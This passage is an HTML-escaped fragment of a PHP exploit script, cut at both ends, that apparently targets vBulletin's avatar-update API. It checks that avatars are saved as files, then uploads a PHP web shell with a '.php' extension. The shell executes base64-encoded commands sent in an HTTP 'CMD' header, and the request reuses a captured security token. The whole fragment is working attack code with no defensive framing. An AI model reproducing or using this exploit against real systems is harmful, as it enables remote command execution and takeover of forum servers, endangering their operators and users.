&quot;); if (preg_match(&#x27;/image\.php\?/&#x27;, $path)) die(&quot;[-] Sorry, the &#x27;Save Avatars as Files&#x27; option is disabled!
&quot;); print &quot;[-] Updating avatar with PHP shell...
&quot;; $php_code = &#x27;&lt;?php print(&quot;____&quot;); passthru(base64_decode($_SERVER[&quot;HTTP_CMD&quot;])); ?&gt;&#x27;; $params = [&quot;routestring&quot; =&gt; &quot;ajax/api/user/updateAvatar&quot;, &quot;userid&quot; =&gt; 0, &quot;avatarid&quot; =&gt; 0, &quot;data[extension]&quot; =&gt; &quot;php&quot;, &quot;data[filedata]&quot; =&gt; $php_code, &quot;securitytoken&quot; =&gt; $token[1]]; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); if (curl_exec($ch) !== &quot;true&quot;) die(&quot;[-] Update failed!
